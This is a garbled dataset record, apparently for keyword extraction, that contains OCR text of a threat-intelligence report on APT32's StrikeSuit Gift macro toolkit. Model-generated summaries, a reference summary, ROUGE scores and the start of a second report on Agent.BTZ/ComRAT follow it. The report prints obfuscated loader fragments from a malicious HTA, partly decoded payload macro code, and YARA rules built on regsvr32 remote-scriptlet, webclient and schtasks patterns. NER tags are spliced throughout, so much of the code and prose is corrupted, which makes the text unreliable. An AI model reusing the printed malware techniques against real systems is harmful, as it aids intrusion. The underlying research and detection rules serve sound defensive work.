\" [WORK_OF_ART] System . Text . ASCIIEncoding\")sEt MicSotThasGaw = [PERSON] quAnGghuT ( \" [WORK_OF_ART] System . Security . Cryptography . FromBase64Transform\")SEt QuengZiwGhat = [PERSON] QUANGgHUt ( \" [WORK_OF_ART] System . IO.MemoryStream\")QuengZiwGhat . Write MicSotThasGaw . TransformFinalBlock ( DapVen . GetBytes_4 ( ThepGhotChudVong ) , 0 , [ORG] HengThew ) , 0 , ChedBomQuengZiwGhat . Position = PitWhiwVengSeT NingGhac = QuengZiwGhat eND fUNCtIonWhen we execute that [ORG] HTA in a virtual machine , out pops a backdoor , fresh as a newborn fawn . The backdoor makes [ORG] HTTP [ORG] POST requests with URIs that appear to contain fake , randomized words likely using some variation of the custom [ORG] HTTPprov library previously described by [ORG] ESET.HTTP [ORG] POST requests with randomized word URIs fromthe backdoor in [DATE] 2019 [ORG] OceanLotus [ORG] HTA file THREAT RESEARCH REPORTA [DATE] 2019 blog by [ORG] NSFOCUS examines this exact backdoor and demonstrates the [ORG] URI generation algorithm generating the vowels and consonants array as [ORG] aAeiou and [ORG] aBcdyzfghjklpwr , respectively . This technique by [ORG] HTTPprov is clearly different from the approach in the [ORG] ObfuscationHelper project , yet these methods show the developers behind APT32 ( and [ORG] OceanLotus ) malware kits wish to provide flexible functionalities that create fake , randomized strings that look almost ( but not quite ) like real words . This is an important piece of tradecraft because it is something we can study and track as the developers evolve the toolset.6004/2022The origin story of APT32 macros THREAT RESEARCH REPORTNSFOCUS depictions of the [ORG] URI generation algorithmAPT32 then and now The [ORG] StrikeSuit [ORG] Gift package of malware is undoubtedly linked to APT32 based on the [ORG] ShellcodeLoader and the XML timestamps that draw concrete connections to attributed APT32 , [ORG] OceanLotus , [ORG] Cobalt [ORG] Kitty , and other monikers for this rampant threat actor . Looking at the obfuscation and randomization tradecraft from [ORG] StrikeSuit [ORG] Gift [ORG] \u2019s [ORG] ObfuscationHelper , we can see similarities in other [ORG] OceanLotus projects such as the [ORG] HTTPprov library that helps generate fake URIs for backdoor [CARDINAL] C2 schemas.6104/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTAPT32 has certainly not been sleeping since [DATE] 2017 . Time marches on and a lot has changed . But what has stayed the same ? Instead of looking at the actor \u2019s evolution forward in time , we can take stock of the attacks we see in [DATE] 2022 and connect the dots back to the puzzle pieces of the past . [ORG] Netskope [ORG] Threat [ORG] Labs detailed a [DATE] 2022 APT32 operation using [ORG] MHT lure files and C2 via the legitimate web service [ORG] Glitch.me . The initial lure documents were shipped in a [ORG] RAR file . Taking a peek at [CARDINAL] one of these RARs , we can see the last modified time has modernized to the eight [QUANTITY] - byte Windows FILETIME , so we know the actor is using WinRAR 5   with defaults for high - precision timestamps , just like the rest of us . Inside of an example [ORG] RAR file for this campaign , we find an [ORG] MHT file with a .doc extension , and we see that the document has an [ORG] Alternate [ORG] Data [ORG] Stream ZoneId of 2 . It 's no coincidence that this is the same approach taken in [FAC] StrikeSuit [FAC] Gift [FAC] \u2019s Macros_Builder . Using [ORG] PowerShell to tease out [LOC] the [LOC] ADS [LOC] Zone [LOC] Identifier for [DATE] 2022 [ORG] MHT \u2026 [ORG] FileName : [PERCENT] C:\\Users\\user\\Desktop\\HS.doc [PERCENT] Stream : Zone . Identifier Length : [CARDINAL] 24PS C:\\Users\\user\\Desktop > Get - Content C:\\Users\\user\\Desktop\\HS.doc -stream Zone . [PERSON] Identifier[ZoneTransfer ] ZoneId=2Routine from 2017Macros_Builder\\Form1.cs to add ADSZone Identifier for input filesprivate void buttonCreate_Click(object sender , [ORG] EventArgs e ) { if ( textBoxADS.Text . Trim().Length < = 0)6204/2022The origin story of APT32 macros THREAT RESEARCH REPORT{MessageBox . Show(\"Missing path ! \" ) ; return ; } string StreamName = \" Zone . Identifier \" ; [PRODUCT] FileInfo [PRODUCT] ADSFile = new FileInfo(textBoxADS.Text . Trim ( ) ) ; if ( ADSFile . AlternateDataStreamExists(StreamName ) ) { AlternateDataStreamInfo s = ADSFile . GetAlternateDataStream(StreamName , [ORG] FileMode . Open);s . Delete ( ) ; } AlternateDataStreamInfo FileADS = ADSFile . GetAlternateDataStream(StreamName , [ORG] FileMode . OpenOrCreate);using ( FileStream TWriter = FileADS.OpenWrite ( ) ) { string ZoneTrust = \" [ ZoneTransfer]\\r\\nZoneId=2 \" ; using(StreamWriter FStreamWriter = new StreamWriter(TWriter ) ) { FStreamWriter . [ORG] AutoFlush = true ; FStreamWriter . Write(ZoneTrust);}}MessageBox . Show(\"Alternative Data Stream OK ! \" , \" Complete ! \" , MessageBoxButtons . OK , MessageBoxIcon . Information);}Diving further into [ORG] Glitch.me campaign samples , in [CARDINAL] one [ORG] MHT , we extract and base64 decode the content of Content [ORG] - Location : [CARDINAL] file:///C:/604BB24E / DeliveryInformation_files / editdata.mso to arrive at an ActiveMime blob , which we can decode with oledump and then view the VB macro content . C:\\Users\\user\\Desktop > oledump ActiveMime.bin1 : [CARDINAL] 442 ' PROJECT ' [CARDINAL] 2 : [CARDINAL] 41 ' PROJECTwm ' 3 : M [DATE] 13478 ' [PRODUCT] VBA / ThisDocument [DATE] ' [DATE] 4 : 3452 ' VBA/_VBA_PROJECT [DATE] ' [DATE] 5 : [CARDINAL] 633 ' [PERSON] VBA / dir'6304/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe modern macro content is annoyingly encoded with randomized function and parameter strings and tedious char evaluations of octal , hex , and decimal added and subtracted together . MA5SIed2hG218yR = Chr((121 - 0o164 + 0x50 ) ) + Chr((143 + 0xD2 - 0xEE ) ) We can do a quick check of these using Python . [ORDINAL] First we find and replace all \u201c & 0 \u201d and \u201c & H \u201d and replace those with [CARDINAL] 0o and [CARDINAL] 0x prefixes that are Python friendly . Replace any & s with + s and now we \u2019re cookin with fire . This is the exact approach that researcher [PERSON] Gustavo [PERSON] Palazolo took in this script to help decode the macro strings , but we \u2019re demonstrating it here for extra fun . Next , just test out a couple expressions at the Python [ORG] CLI . > > > z = \" [QUANTITY] 121 [QUANTITY] - [QUANTITY] 0o164 [QUANTITY] + 0x50 \" > > > print(chr(evaluate(z ) ) ) U > > > MA5SIed2hG218yR = chr(evaluate(\"121 - 0o164 + 0x50 \" ) ) + chr(evaluate(\"143 + 0xD2 - 0xEE \" ) ) + chr(evaluate(\"0xC0 - 0xB3 + 0o130 \" ) ) + chr(evaluate(\"147 - 156 + 0o173 \" ) ) + chr(evaluate(\"13 + 0x13 \" ) ) + [TIME] chr(evaluate(\"0x48 [TIME] - [TIME] 0o222 [TIME] + 0o213 \" ) ) [PERSON] + [PERSON] chr(evaluate(\"0o212 [PERSON] - [PERSON] 0xAF + 0o210 \" ) ) + chr(evaluate(\"0x9F + 0xA0 - 220 \" ) ) + chr(evaluate(\"0o220 + 88 - 0o171 \" ) ) + chr(evaluate(\"113 + 0x4 \" ) ) + chr(evaluate(\"170 - 0x8F + 83 \" ) ) [PERSON] + [PERSON] chr(evaluate(\"196 [PERSON] - [PERSON] 0x50 \" ) ) > > > print(MA5SIed2hG218yR ) User AccountNow that we know this works , one might run through and clean up the obfuscated VB into more of a human - readable text and begin to tease out the innards of the macro . Private Sub ePtqP5mQjVHX4H()On Error Resume Next aGJ5m9Jtam95y = \" [ORG] Microsoft [ORG] Outlook [ORG] Sync \" V9sMn9FaY = \" TL284151.doc \" Dim MA5SIed2hG218yR As String MA5SIed2hG218yR = \" User Account \" RCGt2dyOgy5 MA5SIed2hG218yR = MA5SIed2hG218yR + \" Pictures [WORK_OF_ART] \" [WORK_OF_ART] E0xI2h2kKxi9ra [WORK_OF_ART] = [WORK_OF_ART] \" background.dll \" w2cHY5K1n = \" \\guest.bmp\"6404/2022The origin story of APT32 macros THREAT RESEARCH REPORTyR1QBm2tf10 = ThisDocument . FullName MA5SIed2hG218yR = \" \\Microsoft\\ \" + MA5SIed2hG218yR + w2cHY5K1n MA5SIed2hG218yR = Environ(\"AllUsersProfile \" ) + MA5SIed2hG218yR kMcnWThP5l = Environ(\"AllUsersProfile \" ) + \" \\ \" + aGJ5m9Jtam95y Dim b6Ot02TnO5CCSH8 ( ) As String b6Ot02TnO5CCSH8 = Split(kMcnWThP5l , \" \\\") cache = b6Ot02TnO5CCSH8(LBound(b6Ot02TnO5CCSH8 ) ) For PxSn9cV7c = LBound(b6Ot02TnO5CCSH8 ) + 1 To [ORG] UBound(b6Ot02TnO5CCSH8)cache = cache + \" \\ \" + b6Ot02TnO5CCSH8(PxSn9cV7c ) MkDir cacheEven when partially decoded , this payload macro might appear to have little to do with [ORG] StrikeSuit Gift Macros_Builder source code . But our guess is that if someone analyzes enough of the new APT32 macros , they will see similarities in how the malware developer uses VB to write binary data , perform randomized string generation , or do error handling . It 's not unreasonable to imagine that these [DATE] 2022 [ORG] MHT and macro payloads were created with heavily modernized versions of the tooling found throughout the [PRODUCT] StrikeSuit [PRODUCT] Gift package . The final backdoor from this elaborate [DATE] 2022 campaign purportedly uses a Windows Scheduled Task for persistence . Some things never change.6504/2022The origin story of APT32 macros THREAT RESEARCH REPORTEpilogue6604/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTIn our analysis of [ORG] StrikeSuit [ORG] Gift , we did a quick and dirty inspection of the source code , we took a gander at the macro builders , and we sifted through the malware and the slew of artifacts that came along with it . We observed the evolutionary timeline of several interdependent code projects and we established connections to the threat actor APT32 . Part of the thrill of threat analysis is that most investigations end not with final answers but with new questions . We dusted off this archaic tome of APT32 macros , and through our analysis , we discovered fresh starting points for tracking the threat actor into the future . Intrusion operations come and go , but threat actors are forever . We plan to continue sharing unique analysis to help advance the field of threat intelligence but also to engage and inspire the next generations of threat analysts . We hope that this origin story and expos\u00e9 was informative , or at least a little bit fun . [PERSON] Holler if you \u2019ve got questions , comments , corrections , or something to add ; otherwise , see you around the internet.6704/2022The origin story of APT32 macros THREAT RESEARCH REPORTAppendix6804/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTYARA rules These precise [ORG] YARA rules may help bubble up files related to APT32 and [ORG] StrikeSuit Gift.rule APT32_WebBuilder_ShellcodeLoader_L_dll_timestmp { meta : author = \" [WORK_OF_ART] Stairwell \" ref = \" [WORK_OF_ART] P17028 [WORK_OF_ART] - [WORK_OF_ART] StrikeSuit [WORK_OF_ART] Gift [WORK_OF_ART] - [WORK_OF_ART] Office [WORK_OF_ART] Macro Type1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\bin\\\\Release\\\\L.dll\"condition : pe.timestamp [WORK_OF_ART] = [WORK_OF_ART] = [WORK_OF_ART] 1242474426 } rule APT32_MacrosBuilder_add_schedule_vba_txt_date { meta : author = \" [WORK_OF_ART] Stairwell \" ref = \" [WORK_OF_ART] P17028 [WORK_OF_ART] - [WORK_OF_ART] StrikeSuit [WORK_OF_ART] Gift [WORK_OF_ART] - [WORK_OF_ART] Office [WORK_OF_ART] Macro [WORK_OF_ART] Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \" [DATE] 2016 [DATE] - 06 [DATE] - 02T11:13:39.1668838 \" ascii widecondition:$a } rule APT32_MacrosBuilder_add_schedule_vba_txt_startboundary { meta : author = \" [WORK_OF_ART] Stairwell \" ref = \" [WORK_OF_ART] P17028 [WORK_OF_ART] - [WORK_OF_ART] StrikeSuit [WORK_OF_ART] Gift [WORK_OF_ART] - [WORK_OF_ART] Office [WORK_OF_ART] Macro [WORK_OF_ART] Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \" [DATE] 2016 [DATE] - 06 [DATE] - 02T11:12:49.4495965 \" ascii widecondition:$a } rule [ORG] APT32_MacrosBuilder_add_schedule_vba_txt_regsvr32_to_uri { meta : author = \" [WORK_OF_ART] Stairwell \" ref = \" [WORK_OF_ART] P17028 [WORK_OF_ART] - [WORK_OF_ART] StrikeSuit [WORK_OF_ART] Gift [WORK_OF_ART] - [WORK_OF_ART] Office [WORK_OF_ART] Macro [WORK_OF_ART] Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \" \\\"\\\"\\\\\\\"\\\"regsvr32.exe\\\\\\\"\\ \" /s /n /u /i : http\"condition:6904/2022The origin story of APT32 macros THREAT RESEARCH REPORT$a } rule APT32_ActiveMime_Lure { meta : ref = \" url \" courtesy_of = \" @Mandiant @TekDefense and @itsreallynick\"strings:$a = \" office_text \" ascii wide $ b = \" schtasks /create tn \" nocase ascii wide $ c = \" scrobj.dll \" nocase ascii wide $ d = \" new - object net.webclient \" ascii wide $ e = \" GetUserName \" ascii wide $ f = \" WSHnet . UserDomain \" ascii wide $ g = \" WSHnet . [PRODUCT] UserName \" ascii widecondition:4 of them } rule APT32_Macros_Builder_add_schedule_vba_SpawnBase63 { meta : author = \" [WORK_OF_ART] Stairwell \" ref = \" See HtaDotNetBuilder and HtaDotnet.cs\"strings:$a = \" SpawnBase63 \" nocase ascii wide $ b = \" SpawnBase63 \" base64 base64wide $ c = \" SpawnBase63 \" xor(0x01 - 0xff)condition : any of them}These broad [ORG] YARA rules may help surface or identify files with exported XML scheduled tasks.rule TTP_XML_Scheduled_Task_Date_pcre { meta : author = \" [WORK_OF_ART] Stairwell \" desc = \" XML Scheduled task strings with a Date that has [CARDINAL] seven digits of precision , sinceno reasonable human would type that , we can guess that these are likely exported from [FAC] Windows [FAC] Task [FAC] Scheduler . \"strings:$xml = \" < ? xml version=\\\"\"7004/2022The origin story of APT32 macros THREAT RESEARCH REPORT$task_xml = \" < Task version=\\ \" \" $ pcre = /<Date>[0 - 9]{4}-[0 - 9]{2}-[0 - 9]{2}T[0 - 9]{2}:[0 - 9]{2}:[0 - 9]{2}\\.[0 - 9]{7}<\\/Date>/nocase ascii widecondition : all of them } rule [PERSON] TTP_XML_Scheduled_Task_StartBoundary_pcre { meta : author = \" [WORK_OF_ART] Stairwell \" desc = \" XML Scheduled task strings with a Date that has [CARDINAL] seven digits of precision , sinceno reasonable human would type that , we can guess that these are likely exported from [FAC] Windows [FAC] Task [FAC] Scheduler . \"strings:$xml = \" < ? xml version=\\ \" \" $ task_xml = \" < Task version=\\ \" \" $ pcre = /<StartBoundary>[0 - 9]{4}-[0 - 9]{2}-[0 - 9]{2}T[0 - 9]{2}:[0 - 9]{2}:[0 - 9]{2}\\.[0 - 9]{7}<\\/StartBoundary>/ nocase ascii widecondition : all of them}VTI queries [PERSON] Malware developers may inadvertently leak source code packages to [ORG] VirusTotal , and you can find them by searching for odd bundles with artifacts of the development process . Try different artifacts and different packaging types.content:\".csproj \" type : rar positives:1 + fs:2022 - 04 - 01+content:\".sln \" type : rar positives:1 + fs:2022 - 04 - 01+content:\".suo \" type : rar positives:1 + fs:2022 - 04 - 01+content:\".pdb \" type : rar positives:1 + fs:2022 - 04 - 01+content:\".pyc \" type : rar positives:1 + fs:2022 - 04 - 01 + 7104/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORT\u201cIndicators \u201d Look , it \u2019s kind of a pain to give all the atomic indicators to you in a way that is easy or sensibly useful . If we print out just [GPE] MD5s , someone will ask for SHA256s , and if we give SHA256s , someone else will ask for SHA387s . This is n\u2019t the type of report that is really about the indicators anyway , as many of them are so old it does n't really matter . If you want to take a gander at the [PRODUCT] StrikeSuit [PRODUCT] Gift tooling , we provide links below . Jump in and get dirty ! Looking at the source code is fun and instructive . If you are an intelligence analyst and trying to play the game of connect the dots for purposes of attribution , we recommend you start with the main [PRODUCT] StrikeSuit [PRODUCT] Gift [PRODUCT] RAR file and do your own hashing and [ORG] IOC extraction from there . [PERSON] StrikeSuit [PERSON] Gift [PERSON] RAR file See it in [PERSON] MalShare See it in [ORG] VTLinks and [GPE] referencesAPT32 by [DATE] year A selection of APT32 associated reports by [DATE] year . Year20172018NotesApr 28 , Kaspersky    [ORG] DNS Tunneling [DATE] May [DATE] 17 , Mandiant    APT32 [WORK_OF_ART] Cyber [WORK_OF_ART] Espionage [WORK_OF_ART] Alive [WORK_OF_ART] and [WORK_OF_ART] Well [DATE] May [DATE] 24 , [PERSON] Cybereason    [ORG] Operation [ORG] Cobalt [ORG] Kitty by [ORG] OceanLotus Jun [CARDINAL] 22 , [GPE] Palo [GPE] Alto [GPE] Networks    [ORG] OceanLotus macOS backdoor Nov 11 , Volexity    [ORG] OceanLotus Mass [ORG] Digital SurveillanceMar 01 , ESET    [ORG] OceanLotus [ORG] Old techniques , new backdoor Apr [CARDINAL] 14 , [ORG] Trend [ORG] Micro    New OceanLotus MacOS Backdoor Oct 10 , BlackBerry   Cylance )    Spy RATs of OceanLotus7204/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORT2019202020212022Feb [DATE] 01 , [GPE] Palo [GPE] Alto [GPE] Networks    OceanLotus Downloader [ORG] KerrDown [DATE] Mar [DATE] 20 , ESET    Keeping up with [ORG] OceanLotus decoys [PERSON] Jul [PERSON] 25 , NSHC    Growth of Sector F01 Espionage Apr [CARDINAL] 09 , ESET    [ORG] OceanLotus macOS [ORG] Malware [ORG] Update Apr 24 , Checkpoint    [PERSON] Deobfuscating APT32 [PERSON] Flow [PERSON] Graphs Jun [CARDINAL] 20 , Qi Anxin    [ORG] OceanLotus [ORG] Targets [ORG] Environmental [ORG] Group in [GPE] Vietnam Jul [DATE] 01 , BlackBerry   Cylance )    [ORG] Ratsnif [ORG] New [ORG] Network [ORG] Vermin from OceanLotus Aug [DATE] 01 , BlackBerry   Cylance )    [ORG] OceanLotus StenographyApr 22 , Mandiant    APT32 [GPE] Targeting [GPE] Wuhan and [PERSON] CN [PERSON] Gov on COVID 19 Nov 06 , Volexity    OceanLotus Espionage Through Fake Websites Nov 30 , [ORG] Microsoft    BISMUTH Leverages Coinminers to Fly Under RadarFeb 24 , [ORG] Amnesty [ORG] International    Vietnamese Human Rights Defenders TargetedJan 11 , Netskope    Abusing MS Office Using Web Archive Files Jan 20 , Qi Anxin    OceanLotus Attack Using Glitch PlatformOffice macros \u25cf url \u25cf url [PERSON] Studio [DATE] 2022 \u25cf url \u25cf url \u25cf [ORG] Interop [ORG] Assemblies for Officeurl 20227304/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTFor more information on the intelligence provided in this report , contact us at threatresearch@stairwell.comStairwell helps organizations take back the cybersecurity high ground with solutions that attackers ca n't evade . Its flagship product , the Inception platform , empowers security teams to outsmart any attacker . Stairwell is composed of security industry leaders and engineers from [ORG] Google and is backed by [ORG] Sequoia [ORG] Capital , [ORG] Accel , and [ORG] Gradient [ORG] Ventures . stairwell.com7404/2022", "generated_text": "research; The StrikeSuit Gift; the author; the source code; APT32 macros; the origin; the stealth; the malware; new malware; the source code; VB; VBA; macros; the VB; the RAR; the tool; indicators; indicators; analysis; the malware; toolchain; additional functionality; user; XML; files; detection; commands; the user; time; the exploits; code reuse; domain; code reuse; the name; The developer; the RAR; the communication; the user; XML; the files; the source code; code reuse; YARA rules; VTI queries; indicators; the malware; the source code; a unique toolmark; indicators; values; the commands; the C2; the C2; the master; the C2 server; the C2 server; the C2 server; a C2; the C2 server; the decrypted shellcode; The RAR; the malware; the C2 server; the C2 server; memory; the C2 server; the C2 server; the C2 server; the C2 server; a C2 server; a", "ref_text": "<START-1>The report analyzes source code for a malware toolkit called StrikeSuit Gift that appears linked to the threat actor APT32. The code contains Visual Studio solutions for building malicious Office documents with embedded macros. It includes shellcode test files, obfuscation routines, GUI utilities for creating payloads, and more. Analysis of timestamps, developer fingerprints, and code reuse indicates the toolkit was actively developed around 2016-2017. The report explores StrikeSuit Gift's techniques like using VB macros to run PowerShell scripts and scheduled tasks for persistence. Similarities are drawn to APT32 operations before and after 2017. The toolmarks point to Vietnamese developers and testing for compatibility with Vietnam-based antivirus products. The obfuscation code shares techniques with known APT32 malware for generating randomized strings. Embed Office Macros GUI resembles previous APT32 macro builders. The report concludes StrikeSuit Gift provides source code-level insight into APT32's malware development practices. It likely represents an earlier generation of their ongoing toolkit. By exposing the code, the report aims to advance threat intelligence and help defenders understand and mitigate APT32's tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4042553191489362, "gpt3/lexical/rouge_rouge2": 0.1, "gpt3/lexical/rouge_rougeL": 0.20567375886524825, "gpt3/lexical/rouge_rougeLsum": 0.20567375886524825, "gpt3_generated_text": ["This article explores the origin story of APT32 macros, specifically focusing on the mysterious malware source code package called StrikeSuit Gift. The researchers delve into the development conventions, tradecraft, toolmarks, and potential connections to the threat actor APT32. They analyze the source code package in detail, examining its stealth capabilities, additional functionality, and indicators that point to APT32. The article also discusses the detection and analysis of the malware, including the use of YARA rules and VTI queries. Overall, it provides insights into the VB and VBA macros used by APT32 and sheds light on the techniques and tactics employed by this threat actor."]}, {"split_name": "val", "sample_id": "val_59", "prompt_text": "Extract the keywords: Evolution of sophisticated spyware : from Agent . BTZ to ComRATIn [DATE] November [DATE] 2014 , the experts of the G DATA [PRODUCT] SecurityLabs published an article about ComRAT , the Agent . BTZ successor . We explained that this case is linked to the [ORG] Uroburos rootkit . We assume that the actor behind these campaigns uses several different malware strains is order to compromise the targeted infrastructure : [ORG] Uroburos , a rootkit ; Agent . BTZ / ComRAT , remote administration tools or Linux malware and maybe even more . We decided to have an even closer look at Agent . BTZ and ComRAT and therefore analyzed the evolution of this [ORG] RAT , covering [DATE] seven [DATE] years of development . Here is a table with the minimal information about 46 Ch [CARDINAL] 2.03 Ch [CARDINAL] 2.03 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04Version We d Jun 13 [TIME] 07:31:32 [DATE] 2007 [ORG] UTC [ORG] Ch [CARDINAL] 1.0 We d Jun 13 [TIME] 07:31:32 [DATE] 2007 [ORG] UTC [ORG] Ch [CARDINAL] 1.0 We d Jun 13 [TIME] 07:31:32 [DATE] 2007 UTC Ch [CARDINAL] 1.0 Tue Jun 19 [TIME] 12:41:21 [DATE] 2007 UTC Ch [CARDINAL] 1.0 Tue Jun 26 [TIME] 08:46:11 [DATE] 2007 UTC Ch [CARDINAL] 1.1 Ch 1.1 Tue Jun 26 [TIME] 08:46:11 [DATE] 2007 UTC Ch 1.2wcc Tue [PERSON] Jul 24 [TIME] 12:57:37 [DATE] 2007 UTC Ch 1.2wcc Tue [PERSON] Jul 24 [TIME] 12:57:37 [DATE] 2007 UTC Ch 1.2wcc Tue [PERSON] Jul 24 [TIME] 12:57:37 [DATE] 2007 UTC Thu Jul [CARDINAL] 26 07:20:17 [DATE] 2007 UTC Ch [CARDINAL] 1.2 Mon Dec 3 [TIME] 14:15:58 [DATE] 2007 UTC Ch [TIME] 1.3 [TIME] Ch [CARDINAL] 1.4 Tue [DATE] Dec [DATE] 11 [DATE] 17:36:03 [DATE] 2007 UTC Tue [DATE] Dec [DATE] 11 [DATE] 17:36:03 [DATE] 2007 UTC Ch [CARDINAL] 1.4 Tue [DATE] Dec [DATE] 11 [DATE] 17:36:03 [DATE] 2007 UTC Ch [CARDINAL] 1.4 Ch [CARDINAL] 1.5 Thu [DATE] Mar [DATE] 27 [DATE] 14:58:15 [DATE] 2008 UTC Thu [DATE] Mar [DATE] 27 [DATE] 14:58:15 [DATE] 2008 UTC Ch [CARDINAL] 1.5 Thu [DATE] Mar [DATE] 27 [DATE] 14:58:15 [DATE] 2008 UTC Ch [TIME] 1.5 [TIME] Ch [CARDINAL] 1.5 Thu [DATE] Mar [DATE] 27 [DATE] 14:58:15 [DATE] 2008 UTC Mon May 5 11:27:48 [DATE] 2008 UTC Mon May 12 11:52:31 2008 UTC Thu [DATE] May [DATE] 22 [TIME] 10:24:55 2008 UTC Mon Jun 9 [TIME] 17:23:56 2008 UTC Mon Jun 9 [TIME] 17:23:56 2008 UTC Mon Jun 9 [TIME] 17:23:56 2008 UTC Mon Jun 9 [TIME] 17:23:56 2008 UTC Mon Jun 9 [TIME] 17:23:56 2008 UTCMon Jun 9 [TIME] 17:23:56 2008 UTC Ch [CARDINAL] 2.04 Thu Nov 6 [TIME] 13:21:45 [DATE] 2008 UTC Ch [CARDINAL] 2.05 Thu Nov 6 [TIME] 13:21:45 [DATE] 2008 UTC Ch [CARDINAL] 2.05 Mon Dec 29 [TIME] 11:37:17 [DATE] 2008 UTC Ch [CARDINAL] 2.07 Mon Dec 29 [TIME] 11:37:17 [DATE] 2008 UTC Ch [CARDINAL] 2.07 Mon Sep 14 [TIME] 13:22:57 [DATE] 2009 UTC Ch [CARDINAL] 2.11 Mon Sep 14 [TIME] 15:28:07 [DATE] 2009 UTC Ch [CARDINAL] 2.11 Tue Sep 29 10:28:40 [DATE] 2009 UTC Ch [CARDINAL] 2.12 Mon Dec 7 14:25:12 [DATE] 2009 UTC Ch [CARDINAL] 2.13 Ch [CARDINAL] 2.13 Mon Dec 7 14:27:53 [DATE] 2009 UTC Ch [CARDINAL] 2.14.1 We d Feb 17 [TIME] 15:14:20 [DATE] 2010 UTC Ch [CARDINAL] 3.00 [DATE] Tue [DATE] Jan [DATE] 31 [TIME] 16:12:25 [DATE] 2012 UTC Tue [DATE] Feb [DATE] 14 [DATE] 10:28:06 2012 UTC We d Apr 4 16:23:44 [DATE] 2012 UTC Ch [CARDINAL] 3.02 Ch [CARDINAL] 3.10 Tue [DATE] Dec [DATE] 18 08:22:43 [DATE] 2012 UTC Fri Jun [CARDINAL] 28 [TIME] 12:16:40 [DATE] 2013 UTC Ch [CARDINAL] 3.20 Fri Jun [CARDINAL] 28 [TIME] 12:16:58 [DATE] 2013 UTC Mon Jun [CARDINAL] 24 [TIME] 10:51:01 [DATE] 2013 UTC Ch [CARDINAL] 3.20 Thu Feb 6 [TIME] 12:37:44 [DATE] 2014 UTC Ch [CARDINAL] 3.25 Ch [CARDINAL] 3.26 [DATE] Thu [DATE] Jan [DATE] 3 18:03:46 [DATE] 2013 UTCThanks to the versioning , we can deduce that the compilation dates we saw and currently see actually seem to be legit \u2013 except for the last known version , in which the author modified the compilation date in order to make the analysis more complex . We can see that this malware was really active in [DATE] 2007 and 2008 . New versions declined in frequency in [DATE] 2009 and [CARDINAL] only [CARDINAL] one new sample was identified in [DATE] 2010 . We did not encounter any new sample from [DATE] 2011 , but the malware appeared back in [DATE] 2012 , with a new major version . The [ORG] RAT \u2019s evolution described in [CARDINAL] ten stepsTo describe the evolution of the development , we decided to compare [CARDINAL] ten major versions : Version Ch [CARDINAL] 1.0 ( [DATE] 2007 - 06 ) to Ch [CARDINAL] 1.5 ( [DATE] 2008 - 03 ) Version Ch [CARDINAL] 1.5 ( [DATE] 2008 - 03 ) to Ch [CARDINAL] 2.03 ( [DATE] 2008 - 05 ) Version Ch [CARDINAL] 2.03 ( [DATE] 2008 - 05 ) to Ch [CARDINAL] 2.11 ( [DATE] 2009 - 09 ) Version Ch [CARDINAL] 2.11 ( [DATE] 2009 - 09 ) to Ch [CARDINAL] 2.14.1 ( [DATE] 2010 - 02 ) Version Ch [CARDINAL] 2.14.1 ( [DATE] 2010 - 02 ) to Ch [CARDINAL] 3.00 ( [DATE] 2012 - 01 ) Version Ch [CARDINAL] 3.00 ( [DATE] 2012 - 01 ) to Ch [CARDINAL] 3.10 ( [DATE] 2012 - 12 ) Version Ch [CARDINAL] 3.10 ( [DATE] 2012 - 12 ) to Ch [CARDINAL] 3.20 ( 2013 - 06 ) Version Ch [CARDINAL] 3.20 ( [DATE] 2013 - 06 ) to Ch [CARDINAL] 3.25 ( [DATE] 2014 - 02 ) Version Ch [CARDINAL] 3.25 ( [DATE] 2014 - 02 ) to Ch [CARDINAL] 3.26 ( [DATE] 2013 - 01 ; date has been modified)The following chapter will present the main differences between the versions mentioned above . Here is the resemblance ratio for each version , comparing direct neighbor versions only , created using [ORG] BinDiff : The biggest code update has occurred between version [CARDINAL] 2.14.1 and version [CARDINAL] 3.00 . The gap matches the absence of samples during [DATE] two [DATE] years and this fundamental modification is what we call the death of Code similarity : [CARDINAL] 90%We did not identify strong modification between the [CARDINAL] two samples . However , we can notice the following : The configuration file ( XML ) in version [CARDINAL] 1.5 is stored in [GPE] Unicode and not in [ORG] ASCII anymore ; The [CARDINAL] two versions implement a mechanism to infect new media connected to the infected system . The implementation is not exactly the same nor is the log of media infection ; Code similarity : [CARDINAL] 83%In version [CARDINAL] 2.03 of Agent . BTZ , the authors changed the following : They added obfuscation in order to hide sensitive strings ; The communication protocol was modified in order to include the flag \u201c < CHCMD > \u201d we assume that \u201c CH \u201d has the same meaning than \u201c Ch \u201d before the version number and \u201c CMD \u201d is the abbreviation for command ; From now on , the malware supports \u201c runas \u201d in order to execute commands as administrator . This command was implemented by [ORG] Microsoft in [GPE] Windows [GPE] Vista in [DATE] 2007 . We assume that the author implemented this feature because several targets switched to this version of Windows in 2008.According to an article , version [CARDINAL] 1.5 was used against the [GPE] US Pentagon . We assume that the string Code similarity : [CARDINAL] 96%The codes of these [CARDINAL] two versions are extremely similar to each other , we can only notice small changes : The author changed the name of several registry keys ( probably to avoid detection by well - known IOC ) ; The name of [CARDINAL] two exported functions were modified , too : InstallM ( ) becomes [ORG] AddAtomT ( ) and Code similarity : 98%These codes are really similar to each other , too . We can notice [CARDINAL] only [CARDINAL] two changes : The author patched several bugs ; [CARDINAL] Four new exports appear : DllCanUnLoadNow ( ) , DllGetClassObject ( ) , DllRegisterServer ( ) , DllUnregisterServer().The [CARDINAL] four exported libraries show that the malware has started to support the OLE Component ObjectModel ( COM ) . This version is the [ORDINAL] first version able to be registered as a [ORG] COM object . [CARDINAL] Three of the [CARDINAL] four Code similarity : [CARDINAL] 60%These codes really differ from each other , even if some parts of version 